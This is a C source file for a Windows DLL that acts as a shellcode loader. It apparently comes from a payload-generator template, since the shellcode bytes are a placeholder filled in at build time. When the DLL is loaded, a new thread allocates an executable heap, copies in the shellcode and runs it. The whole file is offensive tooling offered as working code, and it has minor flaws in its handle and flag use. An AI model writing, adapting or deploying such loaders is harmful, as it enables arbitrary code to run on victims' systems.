#include <windows.h>

int heapFuncs(LPVOID nothing)
{
    HANDLE hCr9;
    unsigned char s[] = {{ {.Shellcode} }};
    int size = sizeof(s);
    hCr9 = HeapCreate(0x00040000, size, 0);
    LPVOID pcsHeapAlloc = HeapAlloc(hCr9, 0x00000008, size);
    memcpy_s(pcsHeapAlloc, size, s, size);
    ((void(*)())pcsHeapAlloc)();
    HeapFree(hCr9, 0x00040000, pcsHeapAlloc);
    CloseHandle(hCr9);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
    {
        HANDLE threadHandle1 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)heapFuncs, NULL, 0, NULL);
        if (!threadHandle1)
        {
            CloseHandle(threadHandle1);
        }   
        break;
    }
	case DLL_PROCESS_DETACH:
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	}
	return TRUE;
}
